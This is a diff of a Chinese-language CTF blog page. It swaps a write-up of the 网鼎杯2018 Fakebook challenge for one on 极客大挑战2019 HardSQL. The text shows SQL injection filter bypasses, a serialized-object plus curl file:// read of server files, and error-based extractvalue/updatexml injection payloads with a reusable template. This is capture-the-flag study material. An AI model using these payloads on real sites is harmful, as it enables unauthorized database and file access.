@@ -20,21 +20,21 @@
     var CONFIG = {"hostname":"xh-gotz9.github.io","root":"/","scheme":"Mist","version":"8.0.0-rc.3","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="网鼎杯 2018 - FakeBook网鼎杯2018的题, 还算简单, 可惜自己不带脑子. 离熟练解题还有很长的距离, 感觉主要是没有给自己定一个的测试流程, 经常想到哪做到哪, 脑子一短路就卡壳.">
+  <meta name="description" content="熬夜是没有好事的, 反应慢, 眼睛疼, 根本做不动题. 审题还好歪打正着, 没走太多弯路. 早上起来, 将就晚上写的 payload 操作一下就过了.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="网鼎杯2018 - Fakebook">
-<meta property="og:url" content="https://xh-gotz9.github.io/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/index.html">
+<meta property="og:title" content="极客大挑战2019 - HardSQL">
+<meta property="og:url" content="https://xh-gotz9.github.io/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/index.html">
 <meta property="og:site_name" content="Log Horizon">
-<meta property="og:description" content="网鼎杯 2018 - FakeBook网鼎杯2018的题, 还算简单, 可惜自己不带脑子. 离熟练解题还有很长的距离, 感觉主要是没有给自己定一个的测试流程, 经常想到哪做到哪, 脑子一短路就卡壳.">
+<meta property="og:description" content="熬夜是没有好事的, 反应慢, 眼睛疼, 根本做不动题. 审题还好歪打正着, 没走太多弯路. 早上起来, 将就晚上写的 payload 操作一下就过了.">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-06-25T18:08:20.000Z">
-<meta property="article:modified_time" content="2020-06-27T05:51:21.813Z">
+<meta property="article:published_time" content="2020-06-28T04:42:16.000Z">
+<meta property="article:modified_time" content="2020-06-28T05:10:25.535Z">
 <meta property="article:author" content="gotz9">
 <meta property="article:tag" content="writeup">
 <meta property="article:tag" content="SQLI">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://xh-gotz9.github.io/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/">
+<link rel="canonical" href="https://xh-gotz9.github.io/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/">
 
 
 <script id="page-configurations">
@@ -47,7 +47,7 @@
   };
 </script>
 
-  <title>网鼎杯2018 - Fakebook | Log Horizon</title>
+  <title>极客大挑战2019 - HardSQL | Log Horizon</title>
   
 
 
@@ -134,7 +134,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://xh-gotz9.github.io/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/">
+    <link itemprop="mainEntityOfPage" href="https://xh-gotz9.github.io/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -147,7 +147,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          网鼎杯2018 - Fakebook
+          极客大挑战2019 - HardSQL
         </h1>
 
         <div class="post-meta">
@@ -156,16 +156,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2020-06-26 02:08:20" itemprop="dateCreated datePublished" datetime="2020-06-26T02:08:20+08:00">2020-06-26</time>
+              <time title="创建时间：2020-06-28 12:42:16 / 修改时间：13:10:25" itemprop="dateCreated datePublished" datetime="2020-06-28T12:42:16+08:00">2020-06-28</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-06-27 13:51:21" itemprop="dateModified" datetime="2020-06-27T13:51:21+08:00">2020-06-27</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -191,28 +185,23 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="网鼎杯-2018-FakeBook"><a href="#网鼎杯-2018-FakeBook" class="headerlink" title="网鼎杯 2018 - FakeBook"></a>网鼎杯 2018 - FakeBook</h1><p>网鼎杯2018的题, 还算简单, 可惜自己不带脑子.</p>
-<p>离熟练解题还有很长的距离, 感觉主要是没有给自己定一个的测试流程, 经常想到哪做到哪, 脑子一短路就卡壳.</p>
+        <p>熬夜是没有好事的, 反应慢, 眼睛疼, 根本做不动题.</p>
+<p>审题还好歪打正着, 没走太多弯路. 早上起来, 将就晚上写的 payload 操作一下就过了.</p>
 <a id="more"></a>
-<h2 id="发现-SQL-注入"><a href="#发现-SQL-注入" class="headerlink" title="发现 SQL 注入"></a>发现 SQL 注入</h2><p>登陆/注册页面简单看了下, 应该不是拿admin, 正常注册使用.</p>
-<p>从登陆后首页跳转到 <code>/view.php?no=1</code>. payload <code>?no=0</code>, 页面出现报错.</p>
-<p>进一步尝试注入扫库, 成功, 仅 <code>union select</code> 貌似被检测了, 用 <code>/**/</code> 代替空格绕过.<br>库中仅有 <code>users</code> 表, 字段: <code>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code>, 数据仅有刚注册的用户, 没有其他信息. 看来不是单纯脱裤能解决的.</p>
-<p>查看 data 字段, 是 PHP 的序列化数据, 可以解释访问 <code>?no=0</code> 时开头出现的调用 <code>unserialize</code> 反序列化报错, 以及显示位置出现调用方法报错的原因. data列的数据:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;a22&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:9:&quot;baidu.com&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="审题"><a href="#审题" class="headerlink" title="审题"></a>审题</h2><p>一个简单的登陆, 先是加单引号出现报错, 在 username 栏加单引号的话, 从报错信息可以看出 password 用的是明文, 可以加以利用. 同时推测 WHERE 条件是 <code>username = &#39;?&#39; and password = &#39;?&#39;</code>.</p>
+<p>首先尝试万能密码, 发现被检测了, 也是嘛, 题目也说了爆肝 SQL 注入了, 这肯定有 waf.</p>
+<h2 id="测试-WAF"><a href="#测试-WAF" class="headerlink" title="测试 WAF"></a>测试 WAF</h2><p>被检测的字符:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96; &#96;, &#96;and&#96;, &#96;if&#96;, &#96;union&#96;, &#96;&amp;&#96;, &#96;|&#96;</span><br></pre></td></tr></table></figure>
 
-<h2 id="目录扫描-amp-代码审计"><a href="#目录扫描-amp-代码审计" class="headerlink" title="目录扫描 &amp; 代码审计"></a>目录扫描 &amp; 代码审计</h2><p>到这里看到可能是要利用反序列化, 但是有点没头绪, 查了 writeup 找提示, 发现提到扫目录, 想起了网站常用的 <code>robots.txt</code> 文件, 访问成功, 而且记录了一个路径 <code>/user.php.bak</code>. 打开, 是 PHP 源码, 进行代码审计.</p>
-<p>代码是数据库序列化存储的 <code>UserInfo</code> 类的定义文件, <code>isValidBlog</code> 会对注册提交的连接进行检测, 根据 PHP 报错信息, <code>getBlogContents</code> 会在 <code>view.php</code> 中调用, 它会调用 <code>get</code> 方法利用 <code>curl_exec</code> 函数获取 <code>blog</code> 属性指定的 url 的内容.</p>
-<h2 id="curl-exec-漏洞"><a href="#curl-exec-漏洞" class="headerlink" title="curl_exec 漏洞"></a>curl_exec 漏洞</h2><p>对 PHP 的 curl 功能一无所知… 接下来就是学习时间了</p>
-<p>首先是查到 <a href="https://www.jianshu.com/p/c60aeca68e03" target="_blank" rel="noopener"><code>curl_exec 任意文件读取</code></a>, 利用 <code>file://</code> 协议头可以忽略 host 部分, 直接读取 uri 部分指定的文件. 例如 <code>file://192.168.0.11/etc/passwd</code>, 会直接读取 <code>/etc/passwd</code> 文件.</p>
-<p>进行尝试, 假定 <code>isValidBlog</code> 仅会在注入时调用, 从 <code>view.php</code> 的 SQL 注入点注入一个序列化的 <code>UserInfo</code> 对象则可以绕过. 用之前序列化数据检测回显列, 发现序列化数据在第4列.</p>
-<p>构建 payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;2 AND 0 UNION&#x2F;**&#x2F;SELECT 1,group_concat(data),3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;a22&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:12:&quot;file:&#x2F;&#x2F;&#x2F;flag&quot;;&#125;&#39; FROM users-- -</span><br></pre></td></tr></table></figure>
+<p>晚上实在有点困, 眼皮打架, 没心思测 waf, 测了一点常用的之后就直接开搞了.</p>
+<h2 id="万能密码登陆"><a href="#万能密码登陆" class="headerlink" title="万能密码登陆"></a>万能密码登陆</h2><p>没啥好说的直接上 payload 了:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将SQL改写为: username &#x3D; &#39;x&#39;or(not&#39; and password&#x3D;&#39;^&#39;x&#39;)#&#39;</span><br><span class="line">?username&#x3D;x&#39;or(not</span><br><span class="line">&amp;password&#x3D;^&#39;x&#39;)#</span><br></pre></td></tr></table></figure>
 
-<p>emmm 读不到数据, 测试读取 <code>/var/www/html/view.php.bak</code> 是成功了的… 尴尬了, 测了 <code>/flag</code>, <code>/tmp/flag</code>, <code>./flag</code>, 都没有. 查 writeup 看看师傅们怎么做的吧… 得, 都是扫出来的, flag 文件是 网站目录下的 <code>flag.php</code>, 即 <code>/var/www/html/flag.php</code>, 以此构建 payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;2 AND 0 UNION&#x2F;**&#x2F;SELECT 1,group_concat(data),3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;a22&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39; FROM users-- -</span><br></pre></td></tr></table></figure>
-
-<p>在 <code>view.php</code> 页面中成功拿到 flag. 顺便在 <code>robots.txt</code>  之外我也跑了一次 dirsearch, 没扫出来. 需要更新一下字典或者再找几个扫描工具了.</p>
-
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>绕过后没有给 flag, 才想起了报错注入. 正好绕过的时候吧 WHERE 逻辑改写成 OR 组合, 不会被’短路’, 直接接着改了.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE uname &#x3D; a&#39;or(&#39; AND password &#x3D; &#39;^&#39;a&#39;)or(updatexml(&#39;ab&#39;,concat(&#39;~&#39;,(select(group_concat(table_name)from(information_schema.tables)where((table_schema)like(database())))))))#&#39;</span><br><span class="line"># H4rDsq1</span><br><span class="line"></span><br><span class="line">?username&#x3D;a&#39;or(</span><br><span class="line">&amp;password&#x3D;^&#39;a&#39;)or(extractvalue(&#39;ab&#39;,concat(&#39;~&#39;,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))))))%23</span><br><span class="line"># id, username, password</span><br><span class="line"></span><br><span class="line">?username&#x3D;a&#39;or(</span><br><span class="line">&amp;password&#x3D;^&#39;a&#39;)or(extractvalue(&#39;ab&#39;,concat(&#39;~&#39;,(SELECT(GROUP_CONCAT(username))FROM(H4rDsq1)),20)))%23</span><br><span class="line"># flag</span><br><span class="line"></span><br><span class="line">?username&#x3D;a&#39;or(</span><br><span class="line">&amp;password&#x3D;^&#39;a&#39;)or(extractvalue(&#39;ab&#39;,concat(&#39;~&#39;,right((SELECT(GROUP_CONCAT(password))FROM(H4rDsq1)),20))))%23</span><br></pre></td></tr></table></figure>
+<p>由于报错信息有数据长度限制, 用字符串截取函数即可 (WAF 检测了 <code>substring</code> 函数, 用了 <code>right</code>).</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>改良后的 payload 如下, <code>&lt;INJECT&gt;</code> 的 SQL 语句注意绕过 WAF 即可.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;a&#39;or(extractvalue(</span><br><span class="line">&amp;password&#x3D;,concat(&#39;~&#39;,(&lt;INJECT&gt;))))%23</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -230,11 +219,11 @@
 
         
     <div class="post-nav">
-      <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/" rel="next" title="网鼎杯2020 青龙组 - AreUSerialz">
-      网鼎杯2020 青龙组 - AreUSerialz <i class="fa fa-chevron-right"></i>
+    <a href="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/" rel="prev" title="网鼎杯2020 青龙组 - AreUSerialz">
+      <i class="fa fa-chevron-left"></i> 网鼎杯2020 青龙组 - AreUSerialz
     </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -293,7 +282,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#网鼎杯-2018-FakeBook"><span class="nav-number">1.</span> <span class="nav-text">网鼎杯 2018 - FakeBook</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#发现-SQL-注入"><span class="nav-number">1.1.</span> <span class="nav-text">发现 SQL 注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#目录扫描-amp-代码审计"><span class="nav-number">1.2.</span> <span class="nav-text">目录扫描 &amp; 代码审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#curl-exec-漏洞"><span class="nav-number">1.3.</span> <span class="nav-text">curl_exec 漏洞</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#审题"><span class="nav-number">1.</span> <span class="nav-text">审题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试-WAF"><span class="nav-number">2.</span> <span class="nav-text">测试 WAF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#万能密码登陆"><span class="nav-number">3.</span> <span class="nav-text">万能密码登陆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#报错注入"><span class="nav-number">4.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload"><span class="nav-number">5.</span> <span class="nav-text">payload</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
